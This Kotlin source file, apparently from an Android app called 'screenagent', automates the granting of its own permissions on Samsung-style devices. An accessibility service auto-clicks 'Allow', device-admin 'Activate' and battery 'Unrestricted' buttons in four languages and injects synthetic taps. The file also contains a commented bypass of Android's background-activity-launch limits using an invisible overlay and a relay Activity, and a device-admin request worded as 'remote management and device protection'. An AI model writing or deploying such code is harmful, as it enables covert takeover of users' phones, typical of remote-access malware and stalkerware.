package com.zaka.screenagent.flow.motorola

import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import com.zaka.screenagent.accessibility.BoundaryAccessibilityService

/**
 * 摩托罗拉（OneUI）通用操作层：只用系统公开的 Intent + 无障碍点击，不依赖小米那套。
 *
 * 为什么不直接 startActivity：
 *   Android 10+ 禁止后台应用启动 Activity，我们的服务在后台 → 必须先起一个
 *   前台载体 [MotorolaCarrierActivity]，由它转发 Intent。
 */
object MotorolaNavigator {

    private const val TAG = "Moto"

    // ── 文案表（多语言：中 / 英 / 西 / 葡，覆盖 OneUI 常见地区）
    //    原则：同一个语义把所有语言的写法都列进去，命中哪种用哪种，不依赖系统语言。
    val allowTexts = listOf(
        "允许", "始终允许", "使用应用时", "仅在使用该应用时允许", "允许所有", "确定", "知道了",
        "Allow", "Allow all the time", "While using the app", "OK", "Got it",
        "Permitir", "Permitir todo el tiempo", "Mientras se usa la app", "Aceptar",
        "Permitir", "Permitir todo o tempo", "Ao usar o app", "OK"
    )
    val denyTexts = listOf("不允许", "拒绝", "Deny", "Don't allow", "Denegar", "Recusar")
    val cancelTexts = listOf("取消", "Cancel", "Cancelar")
    val adminActivateTexts = listOf(
        "启动", "激活", "激活此管理应用程序", "激活此设备管理应用", "启用", "确定",
        "Activate", "Turn on", "OK",
        "Activar", "Aceptar", "Ativar", "OK"
    )
    val switchOnTexts = listOf("允许", "开启", "打开", "On", "Allow", "Permitir", "Ativar")
    /** 电池「允许/不受限制」确认按钮（多语言） */
    val batteryAllowTexts = listOf(
        "允许", "总是允许", "确定", "允许所有",
        "Allow", "Allow all the time", "OK",
        "Permitir", "Permitir siempre", "Aceptar",
        "Permitir", "Permitir sempre", "OK"
    )

    val unrestrictedTexts = listOf(
        "不受限制", "不限制", "无限制", "允许后台活动", "不优化",
        "Unrestricted", "Don't optimize", "Not optimized", "Allow background activity",
        "Sin restricciones", "No optimizar", "Permitir actividad en segundo plano",
        "Sem restrições", "Não otimizar"
    )

    // ── BAL 绕过：先挂一个不可见的全屏窗口（无障碍 2032，免权限），
    //    系统认为本应用"有可见窗口"，后台启动 Activity 才会被放行。
    private var balOverlay: android.view.View? = null

    private fun ensureVisibleWindow(service: BoundaryAccessibilityService) {
        if (balOverlay != null) return
        runCatching {
            val wm = service.getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
            val v = android.view.View(service).apply { setBackgroundColor(0x01000000) }
            val lp = android.view.WindowManager.LayoutParams(
                android.view.WindowManager.LayoutParams.MATCH_PARENT,
                android.view.WindowManager.LayoutParams.MATCH_PARENT,
                2032,
                android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    android.view.WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                android.graphics.PixelFormat.TRANSLUCENT
            )
            wm.addView(v, lp)
            balOverlay = v
            Log.d(TAG, "bal overlay added")
            Handler(Looper.getMainLooper()).postDelayed({ dropVisibleWindow(service) }, 6_000L)
        }.onFailure { Log.w(TAG, "bal overlay failed: $it") }
    }

    private fun dropVisibleWindow(service: BoundaryAccessibilityService) {
        val v = balOverlay ?: return
        balOverlay = null
        runCatching {
            val wm = service.getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
            wm.removeView(v)
        }
    }

    fun launch(service: BoundaryAccessibilityService, intent: Intent) {
        // 不挂全屏窗口：实测它会吃掉注入的手势；BAL 已由引导期的前台服务解决
        val host = MotorolaCarrierActivity.host
        if (host != null) {
            runCatching { host.startActivity(intent) }
                .onSuccess { Log.d(TAG, "launch via host: ${intent.action ?: intent.component}") }
                .onFailure { Log.w(TAG, "host launch failed: $it") }
            return
        }
        runCatching {
            MotorolaCarrierActivity.pending = intent
            val i = Intent(service, MotorolaCarrierActivity::class.java)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            service.startActivity(i)
            Log.d(TAG, "carrier start requested")
        }.onFailure { Log.w(TAG, "launch failed: $it") }
    }

    fun openAppDetails(service: BoundaryAccessibilityService, pkg: String = service.packageName) {
        launch(service, Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:$pkg")))
    }

    fun openNotificationAccess(service: BoundaryAccessibilityService) {
        launch(service, Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
    }

    /**
     * 电池优化：优先用**包级请求对话框**（ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS），
     * 它直接弹「允许 love 不受电池优化限制?」，不用在列表里找自己
     * （实测摩托罗拉那个列表里常常找不到我们的包）。
     * 失败再退回列表页。
     */
    fun openBatteryOptimization(service: BoundaryAccessibilityService) {
        val pkgUri = android.net.Uri.parse("package:${service.packageName}")
        val direct = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, pkgUri)
        runCatching {
            launch(service, direct)
            Log.d(TAG, "battery: request-ignore dialog")
        }.onFailure {
            Log.w(TAG, "battery direct failed: $it")
            launch(service, Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
        }
    }

    fun openDeviceAdmin(service: BoundaryAccessibilityService) {
        val cn = ComponentName(service, com.zaka.screenagent.admin.MoyingAdminReceiver::class.java)
        launch(service, Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            .putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn)
            .putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "用于远程管理与设备保护"))
    }

    /** 摩托罗拉「自动运行」候选页（OneUI 各版本类名不同，逐个试，失败就返回 false） */
    fun openAutostart(service: BoundaryAccessibilityService): Boolean {
        val candidates = listOf(
            "com.samsung.android.lool/com.samsung.android.sm.ui.battery.BatteryActivity",
            "com.samsung.android.lool/com.samsung.android.sm.battery.ui.BatteryActivity",
            "com.samsung.android.lool/com.samsung.android.sm.ui.ram.AutoRunActivity",
            "com.samsung.android.sm/com.samsung.android.sm.ui.battery.BatteryActivity",
            "com.samsung.android.lool/.activity.PowerModeActivity"
        )
        for (c in candidates) {
            val parts = c.split("/")
            runCatching {
                val i = Intent().setComponent(ComponentName(parts[0], parts[1]))
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                launch(service, i)
                Log.d(TAG, "autostart candidate -> ${parts[0]}/${parts[1]}")
                return true
            }
        }
        Log.w(TAG, "no autostart activity found")
        return false
    }

    // ── 节点操作（只扫"设置/系统UI/摩托罗拉面板"窗口，避免点到我们自己的载体）

    fun roots(service: BoundaryAccessibilityService): List<AccessibilityNodeInfo> {
        val out = ArrayList<AccessibilityNodeInfo>()
        runCatching {
            service.windows.orEmpty().forEach { w ->
                val r = w.root ?: return@forEach
                val pkg = r.packageName?.toString().orEmpty()
                if (pkg == "com.android.settings" || pkg.startsWith("com.samsung") ||
                    pkg == "com.android.permissioncontroller" || pkg == "com.google.android.permissioncontroller" ||
                    pkg == "android") out.add(r)
            }
        }
        if (out.isEmpty()) service.rootInActiveWindow?.let { out.add(it) }
        return out
    }

    /** 按资源 id 点（比文案稳，摩托罗拉按钮文案随系统版本变） */
    /** 点击诊断：打印当前可见窗口包名 + 节点数，用于判断"看不到页面"还是"点不动" */
    fun dumpWindows(service: BoundaryAccessibilityService, why: String) {
        runCatching {
            val info = StringBuilder()
            service.windows.orEmpty().forEach { w ->
                val r = w.root
                info.append("[${r?.packageName} active=${w.isActive} kids=${r?.childCount}] ")
            }
            Log.d(TAG, "windows($why): $info")
        }
    }

    fun clickById(service: BoundaryAccessibilityService, idSuffix: String): String? {
        for (root in roots(service)) {
            val pool = ArrayList<AccessibilityNodeInfo>()
            collectById(root, idSuffix, 0, pool)
            for (n in pool) {
                if (n.isEnabled && (n.performAction(AccessibilityNodeInfo.ACTION_CLICK) || tap(service, n))) {
                    Log.d(TAG, "click id=$idSuffix")
                    return idSuffix
                }
            }
        }
        return null
    }

    private fun collectById(n: AccessibilityNodeInfo?, id: String, d: Int, out: MutableList<AccessibilityNodeInfo>) {
        if (n == null || d > 30 || out.size > 4) return
        if (n.viewIdResourceName.orEmpty().endsWith(id)) out.add(n)
        for (i in 0 until n.childCount) collectById(n.getChild(i), id, d + 1, out)
    }

    /**
     * 只点 Button 类节点 + **精确**文案。
     * 为什么需要它：Samsung 的通知授权框标题是「允许 love …」，
     * 用包含匹配会先命中标题（TextView），点了没反应。
     */
    fun clickButtonExact(service: BoundaryAccessibilityService, texts: List<String>): String? {
        for (root in roots(service)) {
            for (t in texts) {
                val n = findButtonExact(root, t, 0) ?: continue
                if (!n.isEnabled) continue
                val ok = n.performAction(AccessibilityNodeInfo.ACTION_CLICK) || tap(service, n)
                if (ok) { Log.d(TAG, "clickButton「$t」"); return t }
            }
        }
        return null
    }

    private fun findButtonExact(n: AccessibilityNodeInfo?, want: String, d: Int): AccessibilityNodeInfo? {
        if (n == null || d > 34) return null
        val cls = n.className?.toString().orEmpty()
        if (cls.contains("Button") && n.text?.toString().orEmpty().trim() == want) return n
        for (i in 0 until n.childCount) findButtonExact(n.getChild(i), want, d + 1)?.let { return it }
        return null
    }

    fun clickText(service: BoundaryAccessibilityService, texts: List<String>): String? {
        for (root in roots(service)) {
            for (t in texts) {
                val n = findText(root, t, 0) ?: continue
                if (!n.isEnabled) continue
                val ok = n.performAction(AccessibilityNodeInfo.ACTION_CLICK) || tap(service, n)
                if (ok) { Log.d(TAG, "click「$t」"); return t }
            }
        }
        return null
    }

    fun tap(service: BoundaryAccessibilityService, n: AccessibilityNodeInfo): Boolean = runCatching {
        val r = android.graphics.Rect()
        n.getBoundsInScreen(r)
        if (r.width() <= 0 || r.height() <= 0) return false
        val path = android.graphics.Path().apply { moveTo(r.exactCenterX(), r.exactCenterY()) }
        val g = android.accessibilityservice.GestureDescription.Builder()
            .addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 60))
            .build()
        service.dispatchGesture(g, null, null)
        true
    }.getOrDefault(false)

    fun tapAt(service: BoundaryAccessibilityService, x: Int, y: Int): Boolean = runCatching {
        val path = android.graphics.Path().apply { moveTo(x.toFloat(), y.toFloat()) }
        val g = android.accessibilityservice.GestureDescription.Builder()
            .addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 60))
            .build()
        service.dispatchGesture(g, null, null)
        true
    }.getOrDefault(false)

    /** 列表向上滑（内容上移） */
    fun swipeUp(service: BoundaryAccessibilityService): Boolean = runCatching {
        val path = android.graphics.Path().apply {
            moveTo(540f, 1800f)
            lineTo(540f, 900f)
        }
        val g = android.accessibilityservice.GestureDescription.Builder()
            .addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 320))
            .build()
        service.dispatchGesture(g, null, null)
        true
    }.getOrDefault(false)

    fun findText(n: AccessibilityNodeInfo?, want: String, d: Int): AccessibilityNodeInfo? {
        if (n == null || d > 40) return null
        val t = n.text?.toString().orEmpty()
        if (t == want || (t.isNotEmpty() && t.contains(want))) return n
        for (i in 0 until n.childCount) findText(n.getChild(i), want, d + 1)?.let { return it }
        return null
    }

    fun hasText(service: BoundaryAccessibilityService, want: String): Boolean =
        roots(service).any { findText(it, want, 0) != null }

    fun post(delay: Long, block: Runnable) {
        Handler(Looper.getMainLooper()).postDelayed(block, delay)
    }
}

/**
 * 前台载体：
 *   ① 常驻 25 秒，期间 Android 认为本应用有可见窗口，系统页可以从这里跳；
 *   ② 服务把要跳的 Intent 放在 [pending]，载体起来后立刻转发；
 *   ③ 载体已经存在时，服务直接用 host.startActivity() 复用，不再重复起载体。
 */
class MotorolaCarrierActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        host = this
        Log.d("MotorolaCarrier", "onCreate")
        consume()
        val alive = intent?.getLongExtra(EXTRA_ALIVE_MS, 25_000L) ?: 25_000L
        Handler(Looper.getMainLooper()).postDelayed({ if (host === this) { host = null; finish() } }, alive)
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        consume()
    }

    private fun consume() {
        val t = pending ?: return
        pending = null
        runCatching {
            @Suppress("DEPRECATION")
            // 两种来源都支持：① 旧路径把目标 Intent 放在 EXTRA_TARGET；② 新路径 pending 本身就是目标
            val inner = t.getParcelableExtra(EXTRA_TARGET) as? Intent
            val target = inner ?: t
            Log.d("MotorolaCarrier", "target=${target.action ?: target.component}")
            startActivity(target)
            Log.d("MotorolaCarrier", "startActivity ok")
        }.onFailure { Log.w("MotorolaCarrier", "start failed: $it") }
    }

    override fun onDestroy() {
        if (host === this) host = null
        super.onDestroy()
    }

    companion object {
        const val EXTRA_TARGET = "target_intent"
        const val EXTRA_ALIVE_MS = "alive_ms"

        @Volatile var host: MotorolaCarrierActivity? = null
        @Volatile var pending: Intent? = null

        /**
         * 预热：在"我们自己的 Activity 可见"的时刻（权限框刚结束）启动载体，
         * 此时不受 BAL 限制；载体随后常驻 60 秒，后续系统页都由它转发。
         */
        fun prewarm(ctx: Context, aliveMs: Long = 60_000L) {
            if (host != null) return
            runCatching {
                ctx.startActivity(
                    Intent(ctx, MotorolaCarrierActivity::class.java)
                        .putExtra(EXTRA_ALIVE_MS, aliveMs)
                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                )
                Log.d("MotorolaCarrier", "prewarm requested")
            }.onFailure { Log.w("MotorolaCarrier", "prewarm failed: $it") }
        }
    }
}
